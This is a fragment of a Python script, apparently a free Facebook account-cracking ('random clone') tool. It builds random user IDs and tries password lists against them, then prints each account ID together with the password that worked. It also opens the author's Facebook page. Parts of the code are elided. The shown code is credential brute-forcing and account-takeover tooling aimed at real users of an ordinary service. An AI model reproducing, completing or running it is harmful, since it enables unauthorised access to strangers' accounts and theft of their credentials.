#Create By: RED OUPS 
 #FaceBook: Red oups Islam 
 #GitHub: https://github.com/Redoupshack 
 #---------------------------------------------------------------------------# 
 ...
 for xd in range(10000): 
     ...
     uaku2=(f'{a}{b}{c}{d}{e}{f}') 
     ugen.append(uaku2) 
 os.system('xdg-open https://www.facebook.com/Red.oupshack/?ref=share') 
 logo = (""" 
...
|_| |_/_/   \_\____|_|\_\_____|\___/|_| \_\  
   ...
   \033[1;92m 
  ┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓ 
  ┃ [✓] AUTHOR    \033[1;91m: \033[1;92mMD RED OUPSHACK           ┃ 
  ┃ [✓] TOOL      \033[1;91m: \033[1;92mRANDOM CLONE               ┃ 
  ┃ [✓] STATUS    \033[1;91m: \033[1;92mFREE                       ┃ 
  ┃ [✓] SYSTEM    \033[1;91m: \033[1;92mDATA & WIFI                ┃ 
  ┃ [✓] GITHUB    \033[1;91m: \033[1;92mMRXREDOUPS        ┃ 
  ┃ [✓] FACEBOOK  \033[1;91m: \033[1;92mRED OUPS                ┃ 
 ...
 class Main: 
     def __init__(self): 
         ...
         print("\033[1;32m ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━") 
         Mumit =input(" [?] Choose : ") 
         os.system('xdg-open https://www.facebook.com/Red.oupshack?mibextid=ZbWKwL789219') 
         if Mumit in ["1", "01"]: 
             num() 
         if Mumit in ["2","02"]: 
             gml() 
 ...
 def rcrack1(uid,pwx,tl): 
     ...
     try: 
         for ps in pwx: 
             ...
             sys.stdout.write('\r[\033[1;92mRED\033[1;97m] > [%s/%s] > [OK\033[1;97m:-\033[1;92m%s\033[1;97m] - [CP\033[1;97m:-\033[1;91m%s\033[1;97m] \r'%(loop,tl,len(oks),len(cps))), 
             sys.stdout.flush() 
             ...
             if 'c_user' in log_cookies: 
                 ...
                 coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()]) 
                 cid = coki[82:97] 
                 print(f"\x1b[38;5;196m[RED-CP] {cid}|{ps}") 
                 ...
                 continue 
         loop+=1 
         sys.stdout.write(f'\r\033[m[RED] \033[1;92m%s\033[m |\033[m[\033[mOK:\033[1;92m%s\033[m] '%(loop,len(oks))), 
         sys.stdout.flush() 
     except: 
         pass 
 Main()